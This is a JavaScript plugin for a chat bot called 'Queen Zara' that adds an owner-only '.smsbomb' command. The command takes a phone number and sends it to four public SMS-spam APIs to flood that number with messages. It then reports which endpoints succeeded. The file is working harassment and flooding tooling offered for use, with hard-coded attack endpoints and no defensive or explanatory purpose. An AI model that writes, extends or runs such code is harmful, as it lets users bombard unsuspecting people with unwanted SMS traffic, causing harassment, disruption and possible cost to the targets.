// plugins/smsbomb.js
const axios = require('axios');
const config = require('../config');
const { cmd } = require('../command');

// ── Config ───────────────────────────────
const BOT_NAME    = "Queen Zara";
const API_TIMEOUT = 15000;
// ─────────────────────────────────────────

function onlyDigits(s = '') { return String(s).replace(/\D/g, ''); }

cmd({
    pattern: "smsbomb",
    alias: ["smsbomb", "smsb"],
    use: '.smsbomb <phone number>',
    desc: "SMS bomb target number (owner/admin only)",
    category: "owner",
    react: "💣",
    filename: __filename
}, async (conn, mek, m, { from, q, reply, isCreator, isOwner, isAdmin }) => {

    // ── Owner / admin check ──────────────────
    if (!isCreator && !isOwner && !isAdmin) {
        await conn.sendMessage(from, { react: { text: '⛔', key: mek.key } }).catch(() => {});
        return reply('❌ *Only admins/owner can use this command!*');
    }

    // ── Number ───────────────────────────────
    const target = onlyDigits(q || '');
    if (!target) {
        await conn.sendMessage(from, { react: { text: 'ℹ️', key: mek.key } }).catch(() => {});
        return reply(
            `⚠️ *Usage:* .smsbomb [phone_number]\n\n` +
            `📌 *Example:*\n` +
            `.smsbomb 94703945265`
        );
    }
    if (target.length < 10 || target.length > 15) {
        await conn.sendMessage(from, { react: { text: '❌', key: mek.key } }).catch(() => {});
        return reply('❌ *Invalid number!*\n\nEnter a valid number with country code.');
    }

    // ── APIs ─────────────────────────────────
    const apis = [
        { name: 'siputzx',    url: `https://api.siputzx.my.id/api/tools/smsbomb?number=${target}&amount=10` },
        { name: 'alyachan',   url: `https://api.alyachan.xyz/api/sms?no=${target}` },
        { name: 'ngodingaja', url: `https://api.ngodingaja.my.id/api/spam-sms?no=${target}` },
        { name: 'itsrose',    url: `https://api.itsrose.life/sms?number=${target}` }
    ];

    try {
        await conn.sendMessage(from, { react: { text: '⏳', key: mek.key } }).catch(() => {});

        let succeeded = [];
        let failed    = [];
        let lastErr   = '';

        for (const api of apis) {
            try {
                const { data } = await axios.get(api.url, {
                    timeout: API_TIMEOUT,
                    headers: {
                        Accept: 'application/json',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                    },
                    validateStatus: s => s < 500
                });

                const ok =
                    data?.status === 'success' ||
                    data?.status === true      ||
                    data?.success === true     ||
                    data?.ok === true;

                if (ok) succeeded.push(api.name);
                else    failed.push(api.name);
            } catch (e) {
                failed.push(api.name);
                lastErr = e.message;
                console.error(`[smsbomb] ${api.name} →`, e.message);
            }
        }

        // ── Report ───────────────────────────
        if (succeeded.length) {
            await reply(
                `💣 *SMS BOMB RESULT*\n\n` +
                `👤 *Target:* +${target}\n` +
                `✅ *Working APIs:* ${succeeded.join(', ')}\n` +
                `❌ *Failed APIs:* ${failed.length}\n\n` +
                `⚡ Powered by ${BOT_NAME}`
            );
            await conn.sendMessage(from, { react: { text: '✅', key: mek.key } }).catch(() => {});
        } else {
            await reply(
                `⚠️ *All SMS APIs failed*\n\n` +
                `👤 *Target:* +${target}\n` +
                `❌ *Last error:* ${lastErr || 'unknown'}\n\n` +
                `💡 Those public endpoints are mostly dead. ` +
                `You may need a paid/self-hosted SMS service.\n\n` +
                `⚡ ${BOT_NAME}`
            );
            await conn.sendMessage(from, { react: { text: '⚠️', key: mek.key } }).catch(() => {});
        }

    } catch (error) {
        console.error('[smsbomb]', error);
        await conn.sendMessage(from, { react: { text: '❌', key: mek.key } }).catch(() => {});
        return reply(`❌ *Error:* ${error.message}`);
    }
});